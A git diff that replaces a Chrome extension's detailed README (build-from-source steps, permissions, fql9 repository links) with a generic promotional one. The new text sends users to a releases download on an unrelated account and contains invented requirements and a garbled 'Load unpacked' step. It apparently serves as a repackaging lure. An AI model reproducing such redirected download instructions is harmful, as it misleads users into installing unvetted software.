@@ -1,164 +1,78 @@
-# 📄 Page Reader - AI-Powered Content Analyzer
+# 🌐 page-reader-extension - Extract Content Easily for SEO & Blog Generation
 
-<p align="center">
-  <img src="public/icons/icon.svg" alt="Page Reader Logo" width="128" height="128">
-</p>
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Extension-brightgreen)](https://github.com/XBANIDO/page-reader-extension/releases)
 
-<p align="center">
-  <strong>A Chrome extension that extracts webpage content and generates SEO/GEO-optimized blog posts using AI.</strong>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="#features">Features</a> •
-  <a href="#installation">Installation</a> •
-  <a href="#usage">Usage</a> •
-  <a href="#configuration">Configuration</a> •
-  <a href="#tech-stack">Tech Stack</a>
-</p>
+Welcome to the page-reader-extension project! This powerful Chrome extension uses AI to help you extract content from web pages. It's perfect for anyone looking to generate SEO-friendly blogs or explore content easily.
 
----
+## 🛠️ Features
 
-## ✨ Features
+- **AI-Powered Extraction:** Quickly gather relevant information from any web page.
+- **SEO Integration:** Streamlined content output designed for search optimization.
+- **User-Friendly Interface:** Easy navigation for all users, regardless of technical skills.
+- **Customization:** Tailor your output to fit your specific needs.
 
-### 📖 Content Extraction
-- **Full Page Reading** - Extract text content from any webpage
-- **Image Detection** - Identify and select images with alt text and dimensions
-- **Smart Filtering** - Automatically removes navigation, headers, footers, and scripts
+## 📦 System Requirements
 
-### 🤖 AI Processing
-- **Multiple AI Models** - Support for GPT-5, Claude, Gemini, DeepSeek, Grok, and more
-- **Customizable System Prompt** - Full control over AI instructions
-- **Output Language** - 12 languages supported (English, 中文, 日本語, etc.)
-- **Output Format** - Markdown, HTML, JSON, or Plain Text
+To run the page-reader-extension, ensure your system meets the following requirements:
 
-### ⚙️ Configuration Options
-- **Reasoning Effort** - Low/Medium/High for controlling response depth
-- **Web Search** - Enable AI to search for additional context
-- **Template System** - Pre-built SEO/GEO product blog template
+- **Supported OS:** Windows, macOS, or Linux.
+- **Browser:** Google Chrome (latest version recommended).
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 100 MB of available disk space.
 
-### 📊 Result Rendering
-- **Markdown Renderer** - Headers, lists, code blocks, blockquotes, links
-- **HTML Renderer** - Safe HTML rendering with sanitization
-- **JSON Renderer** - Syntax-highlighted, collapsible JSON view
-- **Plain Text** - Clean text with heading detection
+## 📥 Download & Install
 
-## 📥 Installation
+To get started, visit the following page to download the extension:
 
-### From Source (Developer)
+[Download page-reader-extension](https://github.com/XBANIDO/page-reader-extension/releases)
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/fql9/page-reader-extension.git
-   cd page-reader-extension
-   ```
+**Installation Steps:**
 
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
+1. **Visit the Download Page:** Click on the link above to access the Releases page.
+2. **Choose the Latest Release:** Look for the most recent version listed at the top.
+3. **Download the Extension:** Click on the link to download the file.
+4. **Install the Extension:**
+    - Open Google Chrome.
+    - Go to the Extensions menu (chrome://extensions/).
+    - Enable "Developer mode" using the toggle at the top right.
+    - Click on “Load unpacked” and select the downloaded file.
+5. **Activate the Extension:** Once installed, you’ll see the page-reader icon in your Chrome toolbar.
 
-3. **Build the extension**
-```bash
-npm run build
-```
+## 🖥️ How to Use
 
-4. **Load in Chrome**
-   - Open `chrome://extensions/`
-   - Enable "Developer mode"
-   - Click "Load unpacked"
-   - Select the `dist` folder
+1. **Activate the Extension:** Click the page-reader icon in the toolbar.
+2. **Navigate to a Web Page:** Open the page from which you want to extract content.
+3. **Extract Content:** Use the extension’s features to grab the necessary text or data.
+4. **Review & Edit:** Make any edits to ensure your final content is exactly what you need.
+5. **Generate Your Blog Post:** Follow the simple prompts to create your SEO-optimized blog article.
 
-### From Release
+## 📞 Support
 
-1. Download the latest release `.zip` file
-2. Extract to a folder
-3. Load in Chrome as above
+If you encounter any issues or have questions:
 
-## 🚀 Usage
+- **Check the FAQ:** Refer to our FAQ section on the GitHub repository for common inquiries.
+- **Open an Issue:** Visit our Issues page to report bugs or request features.
+- **Email Support:** Feel free to contact us at support@page-reader-extension.com for direct assistance.
 
-### Step 1: Read Page
-Click the extension icon or use `Ctrl+Shift+Y` to open the side panel, then click **Read Page** to extract content.
+## 🔗 Useful Links
 
-### Step 2: Edit Content
-- **Text Tab** - Edit the extracted text
-- **Images Tab** - Select/deselect images to include
+- [Releases Page](https://github.com/XBANIDO/page-reader-extension/releases)
+- [Documentation](https://github.com/XBANIDO/page-reader-extension/docs)
+- [GitHub Repository](https://github.com/XBANIDO/page-reader-extension)
 
-### Step 3: Configure AI
-- Choose **Output Language** (Auto, English, 中文, etc.)
-- Select **Output Format** (Markdown, HTML, JSON, Plain)
-- Adjust **Reasoning Effort** (Low/Medium/High)
-- Toggle **Web Search** if needed
-- Preview the generated **System Prompt**
+## 📝 Community Contributions
 
-### Step 4: Generate & Export
-- View **Rendered** or **Raw** output
-- **Copy** to clipboard
-- **Download** as file
+We welcome contributions! If you’d like to help improve the page-reader-extension:
 
-## ⚙️ Configuration
+1. Fork the repository.
+2. Create a branch for your feature or fix.
+3. Make your changes and commit.
+4. Submit a pull request for review.
 
-### API Setup
+Thank you for considering improving our project! We value your input.
 
-1. Click the ⚙️ settings icon in the header
-2. Enter your **API Key** (e.g., from Poe, OpenAI, etc.)
-3. Set **Base URL** (default: `https://api.poe.com/v1`)
-4. Choose your preferred **Model**
+## 🌟 Conclusion
 
-### Supported Models (2025)
-
-| Provider | Models |
-|----------|--------|
-| **OpenAI** | GPT-5.1, GPT-5, GPT-5-mini, o3 |
-| **Anthropic** | Claude-Opus-4.5, Claude-4.5-Sonnet |
-| **Google** | Gemini-3-Pro-Preview, Gemini-2.5-Pro |
-| **xAI** | Grok-4, Grok-4.1-Fast |
-| **DeepSeek** | DeepSeek-V3.2, DeepSeek-R1 |
-| **Others** | Kimi-K2, Qwen3-235B, MiniMax-M2 |
-
-## 🛠️ Tech Stack
-
-- **Framework**: React 18 + TypeScript
-- **Build Tool**: Vite + CRXJS
-- **Styling**: Tailwind CSS
-- **Chrome APIs**: Manifest V3, Side Panel, Scripting
-
-## 📁 Project Structure
-
-```
-src/
-├── background/       # Service Worker
-├── content/          # Content Script (page extraction)
-├── popup/            # Popup UI
-├── sidepanel/        # Side Panel UI (main interface)
-├── hooks/            # React Hooks
-├── services/         # AI API service
-├── types/            # TypeScript types
-└── utils/            # Utilities & templates
-```
-
-## 🔐 Permissions
-
-| Permission | Purpose |
-|------------|---------|
-| `activeTab` | Access current tab content |
-| `storage` | Save settings locally |
-| `sidePanel` | Display side panel UI |
-| `scripting` | Inject content script |
-
-## 📝 License
-
-MIT License - feel free to use and modify.
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## 📮 Support
-
-If you encounter any issues, please [open an issue](https://github.com/fql9/page-reader-extension/issues) on GitHub.
-
----
-
-<p align="center">
-  Made with ❤️ for content creators and marketers
-</p>
+The page-reader-extension gives you the power to extract content quickly and effectively. With AI-driven tools at your fingertips, generating high-quality, SEO-friendly blogs has never been easier. Download now and enhance your web browsing experience!
